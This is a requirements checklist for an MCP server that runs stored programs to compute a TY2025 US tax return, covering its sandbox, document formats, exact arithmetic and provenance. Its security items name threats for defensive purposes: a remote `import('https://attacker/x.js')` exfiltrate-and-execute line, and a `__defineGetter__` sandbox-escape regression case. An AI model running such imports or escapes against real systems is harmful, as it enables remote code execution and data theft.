# Requirements

**Milestone:** v1
**Derived from:** [`.planning/PROJECT.md`](PROJECT.md) · [`todo/plan.md`](../todo/plan.md) · [`fjs/todo/implement-mcp-server.md`](../fjs/todo/implement-mcp-server.md) · [`.planning/research/SUMMARY.md`](research/SUMMARY.md)
**Status:** scoped 2026-08-03

---

## Scope Decisions

These were settled by the user on 2026-08-03 and constrain everything below. Where a
decision overrides a research recommendation, that is recorded explicitly — research
informs, it does not decide.

| Decision | Choice | Note |
|---|---|---|
| **Client** | stdio now, targeting Claude Code / Claude Desktop. **Remote transport (HTTPS + OAuth) is an explicit v2 milestone**, not an unstated assumption. | Resolves C3. ChatGPT cannot connect to a stdio server; the README goal statement must be amended to say so rather than leaving the gap to surface in acceptance. |
| **Tax year** | **TY2025** | **Overrides research's TY2024 recommendation (C4).** Research argued TY2025 could not be diffed against a filed return "at build time" — that reasoning assumed building during the 2025 filing season. It is August 2026 and TY2025 was filed in April 2026, so a filed return exists and Success Criterion 1 is satisfiable. The surviving objection is parameter churn (OBBBA retroactively revised the standard deduction; Schedule 1-A is new), which is a data-sourcing task, not a blocker. |
| **Taxpayer profile** | 65+, has brokerage sales, has dependents, itemizes — "whatever makes it more real-life" | Maximal realism. This is the single largest scope driver in this document and it is a deliberate choice, not an accident. See "Scope Consequences" below. |
| **Security** | Worked on later | The `import()` hole and the exfiltration gap are **accepted and deferred**, not solved. See SEC-* for what v1 still does, and "Accepted Risks" for what it does not. |
| **Entry point** | A distinct export typed `(args) => Effect<CasOp, T>` — not `main` | Answers `todo/plan.md` open question 6, added by Sergey in PR #10. **Adopted over the research recommendation** of `main(ctx)`: research argued for CLI debuggability, but a `CasOp`-scoped signature puts the whitelist in the *type*, and since research separately proved the runtime whitelist is escapable today, the type-level boundary is worth more than `fjs r` compatibility. See EXEC-07. |

### Scope Consequences

The taxpayer profile forces a materially larger form surface than research recommended.
Research's suggested v1 was 1040 core + Schedule B + three document dialects. The selected
profile is roughly 4–5× that:

- **65+ combined with TY2025 makes Schedule 1-A mandatory**, not optional — a 65+ TY2025
  return that omits the senior deduction (Parts I/V/VI, 6% phase-out over $75k/$150k) is
  structurally wrong, not merely incomplete.
- **65+ realistically implies SSA-1099 and 1099-R.** The Social Security Benefits
  Worksheet is an 18-line near-circular computation — research flagged it as one of the two
  hardest single computations in the domain.
- **Brokerage sales pull in the whole capital-gains chain**: 1099-B → Form 8949 →
  Schedule D → the Schedule D Tax Worksheet (strictly harder than the QDCGT worksheet).
  Capital loss carryover also promotes multi-year support from "nice to have" to
  "required".
- **Dependents add Schedule 8812; itemizing adds Schedule A.**

This is buildable and the realism goal is legitimate. It is *not* a five-week v1 in the
shape `todo/plan.md` currently describes. The tiering below exists so the roadmap can
sequence honestly and so the cut line is visible in advance rather than discovered in
week four.

---

## v1 Requirements

Tier labels indicate sequencing pressure, not importance:
**T0** must exist before anything else works · **T1** is the thin end-to-end slice ·
**T2** completes the declared taxpayer profile · **T3** is realism polish.

### Documentation Corrections (DOC-C)

Research found twelve places where a planning document states something now known to be
false. These are hours of work and every one of them is more expensive to discover later.
They come first because subsequent phases would otherwise be planned against text that
dissolves on contact.

- [x] **DOCC-01** *(T0)*: Remove the "validate source with `djs/parser`" remedy from
      `PROJECT.md`, `todo/plan.md`, and `fjs/todo/implement-mcp-server.md`. DJS is a data
      language with no function node; the remedy does not exist. Replace with the deferred
      hardening path.
- [x] **DOCC-02** *(T0)*: ~~Correct the "an operation not in the map simply cannot happen"
      claim to state the guard condition that makes it true.~~ **Done** — and the condition
      is now satisfied by fjs itself as of 0.41.0 (`at` + `assert` in `match`), so the claim
      is true as written. `PROJECT.md` Context records why.
- [x] **DOCC-03** *(T0)*: Amend the README `## Goal` and `PROJECT.md` Success Criterion 2
      to name Claude Code / Claude Desktop as the demonstration client, and record remote
      transport as a v2 milestone.
- [x] **DOCC-04** *(T0)*: Correct `fjs/todo/implement-mcp-server.md`'s claim that the
      server cannot be proof-tested — true of `casMcpServer`, false of `fjs_run`, because
      `import` is already an effect with a virtual interpreter.
- [x] **DOCC-05** *(T0)*: Rewrite the `import()` deferral justification in `PROJECT.md` so
      it rests on schedule grounds with named compensating controls, not on "the sole user
      is trusted and local" — the untrusted party is the document, not the user.
- [x] **DOCC-06** *(T0)*: Record the TY2025 parameter-churn hazard: parameters must come
      from Rev. Proc. 2024-40 **as modified by Rev. Proc. 2025-32**, never from the
      original 2025 inflation-adjustment release.
- [x] **DOCC-07** *(T0)*: Reconcile the storage-layer money representation with
      AGENTS.md's absolute rule that money in a stored JSON document is a string, never a
      JSON number. Correct EXACT-05's text above and `ROADMAP.md`'s Phase 4 success
      criterion 4 and Phase 5 depends-on line, all of which still specified integer cents
      as a JSON *number* at the storage boundary. Only the storage layer flips — exact
      rationals inside computation and decimal strings on the MCP wire are unaffected.

### MCP Server (MCP)

- [x] **MCP-01** *(T0)*: An MCP server over stdio composing fjs's `casToolRegistry` and
      `evoToolRegistry` plus our own, via the exported `fromRegistry` / `mcpStep` /
      `stdioTransport`. No fork of FunctionalScript.
- [x] **MCP-02** *(T0)*: The server registers successfully with `claude mcp add` and
      completes a full `initialize` → `notifications/initialized` → `tools/list` →
      `tools/call` session.
- [x] **MCP-03** *(T0)*: Declare our own `McpConfig` pinned to protocol version
      `2025-11-25`. Do not reuse `casConfig`, which pins `2024-11-05` and identifies the
      server as `functionalscript-cas`.
- [x] **MCP-04** *(T0)*: The impure launcher is a thin root-level `.js` file; all logic
      lives in `.f.js` modules it calls.
- [x] **MCP-05** *(T0)*: stdout carries JSON-RPC and nothing else, asserted in CI across a
      full session. Any diagnostic output goes to stderr.
- [x] **MCP-06** *(T1)*: `finance_schema(dialect)` returns the RTTI schema for a document
      dialect, so the agent reads field names rather than guessing them.
- [x] **MCP-07** *(T1)*: `finance_tax_params(year)` returns the tax-year parameter set, so
      the agent reads parameters rather than recalling them.
- [x] **MCP-08** *(T2)*: `finance_documents_list` enumerates stored documents with their
      dialect, tax year, and subject.
- [x] **MCP-09** *(T3)*: `fjs_check(hash)` smoke-checks a stored program — imports it and
      confirms it exports `report` — without running it to completion. Correcting this
      entry's earlier, stale text (which named `main`, the `NodeProgram` convention
      AGENTS.md reserves for `index.f.js`'s own entry point, not a guest program's
      `Report<T>` export, and claimed the check inspects whether that export "returns an
      `Effect`," which it deliberately never does — doing so would mean executing it, which
      this requirement's own "never running it to completion" mandate forbids) is itself
      part of MCP-09's own scope, mirroring the identical correction already applied to
      DOC-16's entry in this same phase. An agent-productivity feature with **no** security
      value; it must not be described as a security control.

### Execution Spine (EXEC)

- [x] **EXEC-01** *(T0)*: A restricted effect interpreter, `interpret(map)(effect)`,
      translating a guest effect into a host effect. Depends on `fjs/effects` only — not
      CAS, not Evo, not MCP — so it is fully proof-testable in isolation.
- [x] **EXEC-02** *(T0)*: ~~Operation lookup uses `Object.hasOwn` and the operation map has
      a null prototype.~~ **Delivered upstream in fjs 0.41.0**, which this repo now uses:
      `match` looks up via `at` (`getOwnPropertyDescriptor`-based, prototype chain never
      consulted) and `assert`s the handler exists. Verified — the `__defineGetter__` escape
      now throws. Keep a null-prototype map as cheap defence in depth, but it is no longer
      load-bearing and no local guard is required.
- [x] **EXEC-03** *(T0)*: A non-whitelisted operation is refused with a message naming the
      operation *and* the permitted set (`operation not permitted: fetch; permitted:
      casRead, evoList, evoHead, evoRevision`). Agents self-correct from actionable errors
      and cannot from opaque ones. Still ours: 0.41.0 throws the command name but knows
      nothing of the permitted set. **The throw is a bare string, not an `Error`** (`assert`
      throws its message), so the catch must use the caught value directly — `e.message` is
      `undefined` and an `e instanceof Error` branch misses every refusal.
- [x] **EXEC-04** *(T0)*: Regression proofs for prototype-inherited names specifically:
      `constructor`, `toString`, `valueOf`, `hasOwnProperty`, `__defineGetter__`. These are
      the cases a naive `in` or `!== undefined` guard admits. Still wanted after the 0.41.0
      fix — they now pin behaviour we depend on rather than merely hope for, and they cover
      our refusal *reporting*, which is still ours. Assert on the reported text, not the raw
      throw. Include the two-step `__defineGetter__` escalation (install a getter for a
      denied command, then call it).
- [x] **EXEC-05** *(T0)*: The interpreter accumulates the read set as it dispatches, so a
      run record's `inputs[]` is **observed rather than declared**. A program cannot forget
      to cite, or misreport, what it read.
- [x] **EXEC-06** *(T0)*: A step budget bounds execution. `asyncRun` is an unbounded
      `while(true)`; a generated loop with a wrong termination condition otherwise hangs
      the single-process server silently, with no response and no way to cancel.
- [x] **EXEC-07** *(T0)*: A frozen guest ABI. Two constraints fix its shape:
      - **The entry point is a distinct export, not `main`, typed
        `(args) => Effect<CasOp, T>`** — resolving `todo/plan.md` open question 6. fjs
        names entry points by role (`proof` for tests, `main` for Node CLI programs), so a
        report program is a third role. `main` is wrong in both directions: it returns
        `number` (an exit code, not a report), and `NodeProgram = Program<NodeOp>` where
        `NodeOp = … | Fetch | Fs | Http | Forever | Import | …` — a program typed that way
        *declares* it may reach the network. Since `Program<O>` is already generic in the
        operation set, a `CasOp`-scoped signature **puts the whitelist in the type**, so
        `tsc` rejects a network-reaching program before it is ever stored and EXEC-02's
        runtime refusal becomes a backstop rather than the sole defense. Given that the
        runtime defense is currently escapable, that layering is the point. It also settles
        the `forever` sub-question structurally: `Forever` is a `NodeOp` and simply is not
        in `CasOp`. Cost: CLI debuggability via `fjs r`, which resolves `main` literally.
      - **A `ctx` object carries the vocabulary** — combinators, read-only operation
        constructors, money helpers, `args`. Forced by a verified constraint: a blob in CAS
        cannot resolve bare specifiers, so a stored program cannot `import` anything.

      The ABI and the sandbox are the same object, and every stored program is frozen
      against the convention in force when it was written — so this is decided before the
      first program exists, not after.
- [x] **EXEC-08** *(T1)*: An `fjs_run` MCP tool taking `{ hash, args?, subject?, parents? }`
      — **pinned inputs, not just a program hash.** Evo heads resolve at read time, so a
      program that resolves its own heads is not reproducible.
- [x] **EXEC-09** *(T1)*: `fjs_run` reaches `import()` through the `import_` **effect**, not
      a raw expression, making it proof-testable under `fjs/effects/node/virtual` with no
      filesystem.
- [x] **EXEC-10** *(T1)*: The **tool handler** writes the result and run record to CAS —
      not the program. The guest whitelist stays read-only; `casWrite`/`evoAdd` are never
      in it. This makes provenance structural rather than a program-authorship convention.
- [x] **EXEC-11** *(T1)*: `fjs_run` returns result and run-record hashes plus a bounded
      inline preview, with an **explicit size check** before writing the response. The
      stdio line cap is 128 KiB and overflow degrades to a silent `-32603` with no
      indication that size was the problem.
- [x] **EXEC-12** *(T1)*: Total error capture — including non-`Error` throws, missing
      hashes, and import failures — surfaced as a tool-level `errorResult`, never as a
      process crash.
- [x] **EXEC-13** *(T2)*: Run records mark `pinned: true|false`. Only pinned runs count
      toward reproducibility acceptance.

      > **Closed 2026-08-12 as a SCOPE-BOUNDED completion. Read this before citing it.**
      > This requirement was marked complete, reverted as premature (`14942a9`), and marked
      > again. Both a code review and an independent verification examined the second marking
      > and reached the same split conclusion, so the resolution is recorded here rather than
      > left to the next reader to rediscover.
      >
      > **Sentence 1 is unambiguously true.** `fjs/run/module.f.js` declares `pinned` as a
      > required boolean and `checkReferences` enforces both-or-neither in each direction;
      > `fjs_run` derives it and persists it on both the `ok` and `error` arms. Mutation Gate
      > M2 was run twice, by two agents, and reddens `subjectOnlyWithoutParentsPersistsPinnedFalse`.
      >
      > **Sentence 2 is true only in the sense available to v1.**
      > `countsTowardReproducibilityAcceptance` (`fjs/report/provenance/module.f.js`) is
      > correct and mutation-tested, and PROV-05's real-process proof calls it against two
      > genuinely CAS-fetched run records. But **no production code path gates behavior on
      > it** — and none can, because "reproducibility acceptance" names Phase 14's acceptance
      > activity, which the owner skipped on 2026-08-11. There is no pipeline to gate.
      >
      > **Do not read this checkbox as "the running server refuses unpinned runs."** It does
      > not, by design (07-CONTEXT.md: every run gets a record, pinned or not; refusing
      > unpinned runs would implement a policy nobody asked for). If Phase 14 is ever
      > un-skipped, its acceptance run is the consumer this predicate was built for, and that
      > is the moment to re-check this box's honesty.

### Document Formats and Ingestion (DOC)

All dialects follow the `vnd.fjs.revision` precedent: JSON plus a dialect tag, the dialect
as an exact literal in the schema, media type derived mechanically, validation split into
structural (RTTI) and semantic passes.

- [x] **DOC-00** *(T0)*: **One common document base shared by every type** —
      `{ "dialect": "vnd.fjs.<name>", … }` with `dialect` as an exact-literal discriminant,
      so structural validation alone rejects another type's blob. Each type's remaining
      fields are an **fjs RTTI schema** mirroring `revisionSchema`: the schema is the single
      source of truth and the TypeScript type derives from it via `Ts<typeof schema>`, never
      declared twice. Refinements RTTI cannot express structurally (currency exactness, date
      forms, cbase32 hashes) go in a separate semantic check, as `checkReferences` sits
      beside `revisionSchema`. Because an RTTI `Struct` is a string map of types, the base is
      spread into each type — `{ ...base('vnd.fjs.1099'), ...fields }` — rather than needing
      schema inheritance the type system does not have. **Designing the base for the family
      up front is what lets later types land without reopening it**; if a new type forces a
      base change, that is a signal the base was under-designed, worth noting rather than
      absorbing silently.
- [x] **DOC-01** *(T0)*: Evo subject convention — the artifact chain (raw bytes → OCR →
      typed) is rooted at the **cBase32 hash of the original artifact**; each extracted form
      instance gets its own subject keyed on `(payerTin, recipientTin, accountNumber,
      taxYear, formType)`. Human labels live inside snapshots, never in subjects. A subject
      can never be renamed, and CAS has no delete, so this is decided before any real
      document exists.
- [x] **DOC-02** *(T0)*: A **project-local CAS home**, gitignored — not the shared
      `~/.cas`. There is no delete; real SSNs in a shared store cannot be taken back.
- [x] **DOC-03** *(T1)*: `vnd.fjs.ocr` — near-verbatim page-oriented transcription from the
      agent's vision pass, numbers kept as **printed strings** (`"1,234.56"`). Stored as a
      first-class artifact, not a transient step: it is the only record of what the model
      actually saw, and it lets reclassification branch without a second, nondeterministic
      vision pass.
- [x] **DOC-04** *(T1)*: `vnd.fjs.1099int` — typed fields, integer cents, `Number.isSafeInteger`
      guarded. The `"1,234.56" → 123456` conversion happens on exactly one revision
      boundary.
- [x] **DOC-05** *(T2 → pulled forward to Phase 5)*: `vnd.fjs.w2` — box 12 as a list of
      `(code, amount)` pairs (box-12 confusion is a documented model failure); boxes 15–20
      stored faithfully as a repeating array and never computed on.
- [x] **DOC-06** *(T2)*: `vnd.fjs.1099div`. **Adding this dialect forces the QDCGT
      worksheet** (box 1b > 0) and the Schedule D Tax Worksheet (boxes 2b/2d) — schedule
      the worksheet with the dialect, not after it.
- [x] **DOC-07** *(T2)*: `vnd.fjs.1099b` — including the distinction that a blank box 1e
      means "basis not reported", which is **not** zero.
- [x] **DOC-08** *(T2)*: `vnd.fjs.ssa1099` — required by the 65+ profile.
- [x] **DOC-09** *(T2)*: `vnd.fjs.1099r` — required by the 65+ profile.
- [x] **DOC-10** *(T1)*: Every dialect that transcribes a printed IRS form carries the
      **form revision**, not merely the tax
      year. Box semantics drift between revisions.
- [x] **DOC-11** *(T1)*: Every box is explicitly absent-able. Blank is not zero.
- [x] **DOC-12** *(T1)*: The `CORRECTED` checkbox is modelled as data. It is printed on the
      form itself, so amendment is a read signal, not an inference.
- [x] **DOC-13** *(T2)*: A consolidated brokerage 1099 yields *N* typed documents from one
      PDF. One uploaded file is not one document.
- [x] **DOC-14** *(T1)*: Documented CLI ingestion route for artifacts over 128 KiB
      (`npx functionalscript cas add`), plus a cache-refresh path so a store mutated by
      another process is visible to the running server without a restart.
- [x] **DOC-15** *(T2)*: A retraction story via the `archived` flag, and a decision recorded
      on whether report programs must filter archived revisions.
- [x] **DOC-16** *(T3)*: Dialect registration for `fjs/media`'s `detect`. The registry this
      requirement asks for — "a list of dialect decoders that falls through when none
      match" — already ships in the pinned `functionalscript` 0.43.1 as `dialectEntry`/
      `detect` in `fjs/media/module.f.js`; correcting this entry's earlier, stale text
      (which described an older `fjs/media` recognizing only `vnd.fjs.revision`) is itself
      part of DOC-16's own scope, per 15-RESEARCH.md's "State of the Art" finding. This repo
      adopts that already-shipped machinery LOCALLY (`fjs/media/dialects/module.f.js`,
      Plan 15-06) for every one of its own thirteen dialects, wired into `cas_refresh`'s real
      running path — no upstream contribution is needed or was made.
- [x] **DOC-17** *(T2, added Phase 5)*: `vnd.fjs.medical_expenses` — the substantiation record
      behind Schedule A's medical and dental deduction. Unlike every other dialect it is
      taxpayer-asserted rather than transcribed from an information return: no IRS form
      reports out-of-pocket medical spend. Each entry carries `datePaid` (the deductible year
      is the year PAID), provider, category, amount, and an absent-able `reimbursed` — only
      unreimbursed expense is deductible, and "no reimbursement recorded" must stay
      distinguishable from "the insurer paid nothing". No stored total and no 7.5%-of-AGI
      floor: both need an AGI this document cannot see, and belong to the phase that computes
      Schedule A.
      Per AGENTS.md this is an **fjs change** (take a list of dialect decoders, fall through
      when none match), not local glue — same disposition as the `match` gap. Not blocking:
      our own validation does not need `detect`, which matters only for classifying a blob
      of unknown provenance. *Found independently by both the research pass and Sergey.*

- [x] **DOC-18** *(T2, RETROFITTED — see the note below)*: `vnd.fjs.1099g` — Certain Government
      Payments. Two boxes are **computed**: box 1 (unemployment compensation) and box 4
      (federal income tax withheld). Boxes **2, 5, 6, 7 and 9 are refused by name when
      present and non-zero**, and accepted when zero, because each feeds a line this engine
      does not compute — box 2's state-refund taxability needs the *prior* year's return
      under the tax-benefit rule, and this engine holds one year. Box 11 (state income tax
      withheld) is deliberately **not** refused: state withholding never reaches a federal
      return, so storing it without computing it is correct rather than a gap.
      Registered in `kindVocabulary`, `modeledKinds`, `finance_schema` and
      `fjs/media/dialects` in the same commit, per the Phase 8/11/12 precedent.

### Exact Arithmetic (EXACT)

- [x] **EXACT-01** *(T0)*: An upstreamable exact-arithmetic module — integer cents, exact
      rationals, and named rounding modes. fjs has none of this: `bigfloat` is a
      decimal→binary literal helper with two exports, `prime_field` is crypto modular
      arithmetic, and `divUp`/`roundUp` round up only and truncate rather than floor on
      negatives. Tax lines carry losses.
- [x] **EXACT-02** *(T0)*: Floating-point never touches tax math. Verified hazards:
      `1.005 * 100 === 100.49999999999999`, `(1.005).toFixed(2) === "1.00"`.
- [x] **EXACT-03** *(T0)*: IRS half-up rounding, explicitly not `Math.round`, which is
      asymmetric (`Math.round(-2.5) === -2`) on a form full of negatives.
- [x] **EXACT-04** *(T0)*: Rounding is a property of a **1040 line**, not of a value —
      `round(sum(x))`, never `sum(round(x))`. A money type that rounds on construction is
      wrong by construction.
- [x] **EXACT-05** *(T1)*: Layering fixed deliberately: money as a decimal **string** in
      JSON at the storage boundary (never a JSON number — decoded to exact cents by the
      semantic check, per AGENTS.md), rationals inside computation, decimal **strings**
      on the MCP wire — fjs's JSON `Primitive` has no `bigint`, so a bigint schema cannot
      cross JSON-RPC.

### Tax Computation (TAX)

- [x] **TAX-01** *(T1)*: TY2025 parameters stored as **data**, keyed by year, each carrying
      a source citation (Rev. Proc. number and section) and an effective date. Sourced from
      Rev. Proc. 2024-40 **as modified by Rev. Proc. 2025-32**.
- [x] **TAX-02** *(T1)*: The IRS Tax Table stored as data and diffed **row by row** against
      the published Publication 1040 as a `proof`. Rows print tax on the interval midpoint,
      so the table disagrees with bracket arithmetic — MFJ $18,000 taxable gives $1,803 by
      table and $1,800 by brackets.
- [x] **TAX-03** *(T1)*: Explicit line-16 method dispatch across all branches — Tax Table,
      Tax Computation Worksheet, QDCGT worksheet, Schedule D Tax Worksheet — with a proof
      per branch. Line 16 is not bracket arithmetic.
- [x] **TAX-04** *(T1)*: Boundary proofs at `threshold − 1¢`, `threshold`, `threshold + 1¢`
      for every threshold in the parameter data.
- [x] **TAX-05** *(T1)*: Form 1040 core lines 1a–37.
- [x] **TAX-06** *(T1)*: Standard deduction with age and blindness increments.
- [x] **TAX-07** *(T2)*: Schedule B — interest and ordinary dividends, including the $1,500
      threshold and the foreign-account questions.
- [x] **TAX-08** *(T2)*: Qualified Dividends and Capital Gain Tax Worksheet (~25 lines),
      which calls **back into** the Tax Table for its ordinary-income component.
      **Delivered in Phase 10**, not Phase 12 as the roadmap originally scheduled:
      `fjs/tax/line16/qdcgt/module.f.js` imports `baseTaxForAmount` from `fjs/tax/table`
      and its proofs assert `method22 === 'taxTable'`. Verified 2026-08-07 while scoping
      Phase 12; the phase text that scheduled building it was stale and has been corrected.
- [x] **TAX-09** *(T2)*: **Schedule 1-A Parts I/V/VI** — mandatory given TY2025 + 65+.
      Senior deduction with 6% phase-out over $75k/$150k, feeding Form 1040 line 13b.
- [x] **TAX-10** *(T2)*: Social Security Benefits Worksheet — an 18-line near-circular
      computation. Required by the 65+ profile.
- [x] **TAX-11** *(T2)*: Form 8949 and Schedule D, including the Schedule D Tax Worksheet.
      Required by brokerage sales.
- [x] **TAX-12** *(T2)*: Schedule 8812. Required by dependents.
- [x] **TAX-13** *(T2)*: Schedule A. Required by itemizing, and it must compare against the
      standard deduction rather than assuming itemizing wins.
- [x] **TAX-14** *(T2)*: Schedule 1 and Schedule 2/3 to the extent the profile reaches them.
- [x] **TAX-15** *(T2)*: Worksheets modelled in IRS order, one named pure function per
      worksheet carrying the printed form's line numbers. **No variable named `magi`** — the
      MAGI for the IRA deduction, Roth eligibility, the Premium Tax Credit, IRMAA, and the
      student-loan-interest deduction have different add-back lists.
- [x] **TAX-16** *(T1)*: A **scope guard** — unmodeled input causes a loud refusal, never a
      silently omitted line. This is what makes a partial 1040 honest instead of quietly
      wrong, and it is how REQ TAX-05's "full line-by-line" claim stays truthful.
- [x] **TAX-17** *(T3)*: Multi-year support, including capital loss carryover, which the
      brokerage profile promotes from optional to required.
- [x] **TAX-18** *(T2, RETROFITTED — see the note below)*: Unemployment compensation reaching
      the return. Schedule 1 line 7 becomes a real computed line summing box 1 across every
      1099-G, flowing to **1040 line 8** via Schedule 1's Part I total; 1099-G box 4 joins
      **1040 line 25b**. Before this, Schedule 1 line 7 was a declared zero whose only scope
      kind was a coarse catch-all — which is precisely why TAX-16's guard **refused a real
      taxpayer's transcript**, correctly, on the first real document the engine ever saw.
      `Form1040Inputs.unemploymentForms` is a **required** field, so `tsc` enforces it on
      every production caller.

### Provenance and Reporting (PROV)

- [x] **PROV-01** *(T1)*: A report line type in which `{ value }` without `{ sources }`
      **does not typecheck**. Traceability enforced by the type system, not by convention.
- [x] **PROV-02** *(T1)*: Every computed line carries `(documentHash, boxPath, value)`
      tuples plus the rule or worksheet line it implements.
- [x] **PROV-03** *(T1)*: A `vnd.fjs.run` record — program hash, observed inputs, result
      hash, status, pinned flag — written by the tool handler on every run.
- [x] **PROV-04** *(T2)*: Report output states the tax year, the parameter-set hash, and the
      program hash alongside the figures.
- [x] **PROV-05** *(T2)*: Re-running a pinned program over the same inputs reproduces the
      report **byte-identically**, verified adversarially: add an amended revision *between*
      two runs and assert the output does not move. A reproducibility check that passes
      only because nothing changed is not a check.
- [x] **PROV-06** *(T3)*: Mechanical Form 1040-X columns from a report diff. Form 1040-X is
      literally a three-column diff (A original, B net change, C correct), so corrected
      document → new revision → re-run → diff yields Columns A/B/C with per-line source
      hashes already attached. No new mechanism required.
- [x] **PROV-07** *(T2)*: An anti-hardcoding check — CAS read count and numeric-literal
      audit reported with each run, plus a perturbation gate (change an input, assert the
      output moves). `main = () => pure({ line16: 9137 })` satisfies every other criterion
      while defeating the entire thesis.
- [x] **PROV-08** *(T3)*: A second, non-tax report over the same documents — the cheapest
      possible demonstration that "reports are programs" rather than a tax engine wearing a
      disguise.

### Security (SEC)

Deferred by explicit decision. What remains here is what costs essentially nothing and
would be materially more expensive to retrofit.

- [x] **SEC-01** *(T0)*: The registered `claude mcp add` launcher carries
      `node --permission` with scoped `--allow-fs-*` from the **first** registration.
      Registering later means the unsafe configuration is the one everyone already has.
- [x] **SEC-02** *(T1)*: A textual import-specifier allow-list enforced before a program is
      materialized — roughly 20 lines, and it closes the
      `import('https://attacker/x.js')` exfiltrate-and-execute variant entirely.
- [x] **SEC-03** *(T1)*: Programs materialized under **content-hash-derived filenames**. The
      ESM cache is keyed by URL and never evicts, so a reused temp filename silently re-runs
      the *first* program.
- [x] **SEC-04** *(T0)*: ~~An upstream bug report to FunctionalScript for the `match`
      prototype-dispatch soundness hole.~~ **Done and closed** —
      [functionalscript#1419](https://github.com/functionalscript/functionalscript/pull/1419),
      fixed in 0.41.0. Note
      [functionalscript#1420](https://github.com/functionalscript/functionalscript/issues/1420)
      is a duplicate of the same defect, filed independently from this branch before #1419
      was known here; it is closed as such.

### Integration and End-to-End Testing (TEST)

Added mid-Phase-7, at the user's direction, after an audit found the project had **133
project-local proofs and exactly one real-process test**. Every other proof runs under
`fjs/effects/node/virtual` — mocked filesystem, mocked stdio, no separate OS process.

The audit's finding that forced this section: **the product's central seam cannot be tested in
the virtual harness at all.** `virtual`'s `writeFile` stores a file as an array of `Vec` chunks
while its `import_` requires the entry at a path to be a `JsModule` function — verified against
upstream source. So "write a program's bytes to disk, then `import()` and run them" is
*structurally uncomposable* in a virtual session. Phase 7's own end-to-end plan therefore used a
`JsModule` stand-in for materialization, which means `fjs_run` — the product — would have shipped
with its central seam evidenced only by a mock.

`cas-refresh-cross-process.test.js` already established the pattern and the precedent, and its
header states the principle these requirements generalise: *"an in-process simulation does not
test the thing that breaks."* It was a one-off; this section makes it a practice.

- [x] **TEST-01** *(T1)*: A real-process integration test for `fjs_run`: a genuinely separate
      `node index.js <home>` OS process, driven over **real stdin/stdout JSON-RPC** through a
      full `initialize` → `notifications/initialized` → `tools/list` → `tools/call` session,
      against a real temporary CAS home on a real filesystem. It must assert the returned figure
      and the result/run-record hashes, **and** that the materialized `.mjs` actually reached
      disk — the one assertion no virtual proof can make.
- [x] **TEST-02** *(T1)*: Every MCP tool this project exposes is exercised at least once through
      that real stdio session, not only through `virtual`. A tool proven solely in-process has
      not been proven to be reachable by a client.
- [x] **TEST-03** *(T2)*: Each subsequent phase that adds a tool, a dialect, or a new seam adds
      real-process coverage for it in the same session harness. The standing rule: a phase is not
      complete when its virtual proofs are green — it is complete when the thing a client would
      actually call has been called.
- [x] **TEST-04** *(T2)*: The integration suite is separable from the fast proof suite, so the
      per-commit loop stays fast while the integration layer still runs before a phase is marked
      complete. Real-process tests cost seconds each; the 133 virtual proofs cost milliseconds
      in total, and conflating them would push developers to skip both.

Scope note, deliberately: these requirements do **not** ask for the virtual proofs to be
replaced. The virtual harness is fast, deterministic, and proves logic well. What it cannot do is
prove that two real subsystems meet. Both layers are wanted; only one of them currently exists.

### Deferred Judgments (MAINT)

Decisions that surfaced during Phases 7-9 and were deliberately **not** taken in the moment, because
each is a maintainer's call rather than an implementation detail. They are recorded as requirements
so they are scheduled rather than remembered. All are T3 — none blocks the v1 tax result.

- [ ] **MAINT-01** *(T3)*: Decide whether the OCR-conversion island is wired or removed.
      `fjs/document/1099int/from_ocr`, `fjs/document/ocr_amount` and `fjs/document/subject` are
      **unreachable from the running server** — an import graph from `index.js` never touches them,
      and a guest program cannot reach them either, since EXEC-07 forbids imports inside a stored
      program. Either an ingest tool is still planned and they are pre-built, or `todo/plan.md`'s
      Track B (the agent reads by vision, emits the dialect, stores via the already-registered
      `evo_add`) supersedes them. Tested code that nothing can execute is worse than either outcome.

- [ ] **MAINT-02** *(T3)*: Reconcile TEST-04 with reality — either meet it or amend it. It is
      marked complete and claims the integration layer is separable "so the per-commit loop stays
      fast", but `npm test` is an unfiltered `tsc && node --test` that runs both real-process tests
      alongside the proofs, for ~15s. There is no proofs-only path. Either add one, or amend the
      requirement to say what the project actually decided.

- [ ] **MAINT-03** *(T3)*: Correct the requirement and roadmap claims that overstate what shipped.
      Known: TAX-02 says the Tax Table is "diffed row by row against Publication 1040" when ten rows
      are hand-transcribed and the remaining ~2,000 are checked against invariants that share code
      with the generator; DOC-04 describes `Number.isSafeInteger`-guarded integer cents when storage
      is canonical decimal strings; the v1 requirement total is written as 79 in one place and 83 in
      another while **95** IDs are defined. (That last figure read 85 until 2026-08-15 — it was
      already stale before the DOC-18/TAX-18 retrofit, not made stale by it. A pending item whose
      job is to fix wrong counts, carrying a wrong count, is the defect describing itself.)

- [ ] **MAINT-04** *(T3)*: Fix the documentation that contradicts the code. DOCC-01 is checked and
      its own verification document asserts a grep is clean, but `fjs/todo/implement-mcp-server.md`
      still carries the `djs/parser` remedy verbatim along with the "sole user is trusted and local"
      rationale DOCC-05 was meant to remove. Separately, that file still reads "Status: spec, not
      implemented" and marks two questions "blocking, resolve before implementing" that are shipped
      and proven.

- [ ] **MAINT-05** *(T3)*: Repair `fjs/todo/upstream-mcp-protocol-version-negotiation.md`'s proposed
      fix, which does not work as written. It compares "the now-already-validated
      `pr.protocolVersion`", but `mcpStep` destructures `const [pr] = validate(...)` — binding only
      the result tag, so `pr.protocolVersion` is `undefined` and the comparison is vacuous. A note
      whose remedy is wrong is worse than no note.

- [ ] **MAINT-06** *(T3)*: Take `functionalscript` 0.43.0. The project is pinned to `^0.41.0` while
      `main` has moved two minor versions. Re-run the upstream-gap notes in `fjs/todo/` against the
      new version — one such note has already been retired by an upstream fix once.

- [ ] **MAINT-07** *(T3)*: Share `executeRun`'s step sequence with `runExecuteRunViaFixture`.
      The rule duplication was removed in 09-05/09-06 (`classifyRunOutcome` now lives once, in
      `fjs/report/guard`), but the ORDER of `loadProgram` → `buildRunSnapshot` → `buildHostMap` →
      `interpret` is still written out twice. Reorder or insert a step in `executeRun` and the
      fixture helper will not follow; only the integration test would notice, and only if the change
      is observable end to end. The helper itself must stay — `fjs/effects/node/virtual` genuinely
      cannot compose a write with an import in one session.

- [ ] **MAINT-08** *(T3)*: Remove or share the two small duplications a dead-code audit found: the
      `formRevision must not be empty` check written out byte-identically in
      `fjs/document/1099int` and `fjs/document/w2` (conspicuous because its sibling money-box rule
      *is* correctly shared via `moneyFieldError`), and `artifactSubject` in
      `fjs/document/subject`, which is the identity function with zero callers.

---

## v2 Requirements — The Product Path and Four Personas

